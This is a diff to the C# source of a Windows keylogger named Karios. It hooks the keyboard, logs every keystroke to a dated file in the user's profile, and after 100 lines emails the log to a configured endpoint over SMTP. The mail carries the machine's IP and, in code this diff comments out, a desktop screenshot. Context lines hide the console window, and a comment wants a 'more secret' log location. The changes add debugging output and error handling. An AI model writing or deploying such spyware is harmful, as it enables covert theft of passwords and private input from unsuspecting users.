@@ -39,6 +39,7 @@ namespace Karios
         public static string picAttachment;
         public static Bitmap memoryImage;
         public static string _keyOnline;
+        private static string pathToLog;
 
         public static void Main()
         {
@@ -53,8 +54,8 @@ namespace Karios
                 // Run on startup 
                 // SetStartup();
                 // Start Application
-                var handle = GetConsoleWindow();
-                ShowWindow(handle, SwHide);
+                // var handle = GetConsoleWindow();
+                // ShowWindow(handle, SwHide);
                 _hookId = SetHook(Proc);
                 Application.Run();
                 UnhookWindowsHookEx(_hookId);
@@ -204,7 +205,7 @@ namespace Karios
 
                     _emailEndpoint = preppedCommand[4];
                     _website = preppedCommand[8];
-
+                    Console.WriteLine("Starting Karios check 2");
                     loop = false;
                 }
             }
@@ -228,32 +229,39 @@ namespace Karios
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode < 0 || wParam != (IntPtr)WM_KEYDOWN) return CallNextHookEx(_hookId, nCode, wParam, lParam);
-            var appName = AppDomain.CurrentDomain.FriendlyName;
-            var vkCode = Marshal.ReadInt32(lParam);
-            var fileName = DateTime.Now.ToString("yyyy-MM-dd");
-            var machineName = Environment.MachineName;
-            // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-            var pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + fileName + machineName + ".txt"; // TODO - get more secret location.
-            var sw = new StreamWriter(pathToLog, true);
-            if ((Keys)vkCode != Keys.Enter)
+            try
             {
-                if ((Keys)vkCode == Keys.Space)
-                    sw.Write(" ");
+                Console.WriteLine("Recording key works");
+                if (nCode < 0 || wParam != (IntPtr)WM_KEYDOWN) return CallNextHookEx(_hookId, nCode, wParam, lParam);
+                var appName = AppDomain.CurrentDomain.FriendlyName;
+                var vkCode = Marshal.ReadInt32(lParam);
+                var fileName = DateTime.Now.ToString("yyyy-MM-dd");
+                var machineName = Environment.MachineName;
+                // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+                pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + fileName + machineName + ".txt"; // TODO - get more secret location.
+                var sw = new StreamWriter(pathToLog, true);
+                Console.WriteLine("About to write");
+                if ((Keys)vkCode != Keys.Enter)
+                {
+                    if ((Keys)vkCode == Keys.Space)
+                        sw.Write(" ");
+                    else
+                    {
+                        sw.Write(((Keys)vkCode).ToString());
+                        Console.Write(((Keys)vkCode).ToString());
+                    }
+                }
                 else
                 {
-                    sw.Write(((Keys)vkCode).ToString());
-                    Console.Write(((Keys)vkCode).ToString());
+                    sw.WriteLine("");
+                    sw.WriteLine((Keys)vkCode);
+                    Console.WriteLine((Keys)vkCode);
                 }
             }
-            else
+            catch
             {
-                sw.WriteLine("");
-                sw.WriteLine((Keys)vkCode);
-                Console.WriteLine((Keys)vkCode);
-            }
-            sw.Close();
-
+                Console.WriteLine("Something went wrong, im dieing");
+            }  
             if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
             try
             {
@@ -265,6 +273,7 @@ namespace Karios
                 mail.Body = "New log file from Computer (" + GetIpAddress(Dns.GetHostName()) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
                 var attachment = new Attachment(pathToLog);
                 mail.Attachments.Add(attachment);
+                /*
                 CaptureDesktop();
                 // Convert it!
                 var memStream = new MemoryStream(); //new one
@@ -275,6 +284,7 @@ namespace Karios
                     Name = "screen"
                 };
                 mail.Attachments.Add(new Attachment(memStream, contentType));
+                */
 
                 // Set ports and stuff
                 smtpServer.Port = 587;
